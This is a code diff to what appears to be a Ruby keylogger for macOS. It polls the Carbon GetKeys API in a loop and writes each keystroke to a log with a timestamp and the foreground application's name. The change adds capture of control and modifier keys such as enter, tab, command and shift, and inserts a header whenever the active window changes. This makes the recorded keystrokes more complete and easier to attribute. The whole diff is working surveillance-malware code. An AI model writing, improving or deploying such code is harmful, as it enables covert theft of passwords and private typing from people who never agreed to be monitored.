@@ -218,7 +218,7 @@ child_pid = fork do
 
   module Carbon
     extend Importer
-    dlload 'Carbon.framework/Carbon'
+    dlload '/System/Library/Frameworks/Carbon.framework/Carbon'
     extern 'unsigned long CopyProcessName(const ProcessSerialNumber *, void *)'
     extern 'void GetFrontProcess(ProcessSerialNumber *)'
     extern 'void GetKeys(void *)'
@@ -238,6 +238,7 @@ child_pid = fork do
 
   itv_start = Time.now.to_i
   prev_down = Hash.new(false)
+  lastWindow = ""
 
   while (true) do
     Carbon.GetFrontProcess(psn.ref)
@@ -251,29 +252,65 @@ child_pid = fork do
     bytes = keymap.to_str
     cap_flag = false
     ascii = 0
+    ctrlchar = ""
 
     (0...128).each do |k|
       # pulled from apple's developer docs for Carbon#KeyMap/GetKeys
       if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)
         if not prev_down[k]
-          kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
-          curr_ascii = Carbon.KeyTranslate(kchr, k, state)
-          curr_ascii = curr_ascii >> 16 if curr_ascii < 1
-          prev_down[k] = true
-          if curr_ascii == 0
-            cap_flag = true
-          else
-            ascii = curr_ascii
+          case k
+            when 36
+              ctrlchar = "[enter]"
+            when 48
+              ctrlchar = "[tab]"
+            when 49
+              ctrlchar = " "
+            when 51
+              ctrlchar = "[delete]"
+            when 53
+              ctrlchar = "[esc]"
+            when 55
+              ctrlchar = "[cmd]"
+            when 56
+              ctrlchar = "[shift]"
+            when 57
+              ctrlchar = "[caps]"
+            when 58
+              ctrlchar = "[option]"
+            when 59
+              ctrlchar = "[ctrl]"
+            when 63
+              ctrlchar = "[fn]"
+            else
+              ctrlchar = ""
+          end
+          if ctrlchar == "" and ascii == 0
+            kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
+            curr_ascii = Carbon.KeyTranslate(kchr, k, state)
+            curr_ascii = curr_ascii >> 16 if curr_ascii < 1
+            prev_down[k] = true
+            if curr_ascii == 0
+              cap_flag = true
+            else
+              ascii = curr_ascii
+            end
+          elsif ctrlchar != ""
+            prev_down[k] = true
           end
         end
       else
-      	prev_down[k] = false
+        prev_down[k] = false
       end
     end
-
-    if ascii != 0 # cmd/modifier key. not sure how to look this up. assume shift.
+    if ascii != 0 or ctrlchar != ""
       log_semaphore.synchronize do
-        if ascii > 32 and ascii < 127
+        if app_name != lastWindow
+          log = log << "[\#{Time.now.to_i}] [\#{app_name}]\\n"
+          lastWindow = app_name
+        end
+        if ctrlchar != ""
+          log = log << "[\#{Time.now.to_i}] [\#{app_name}] \#{ctrlchar}\n"
+        elsif ascii > 32 and ascii < 127
           c = if cap_flag then ascii.chr.upcase else ascii.chr end
           log = log << "[\#{Time.now.to_i}] [\#{app_name}] \#{c}\n"
         else
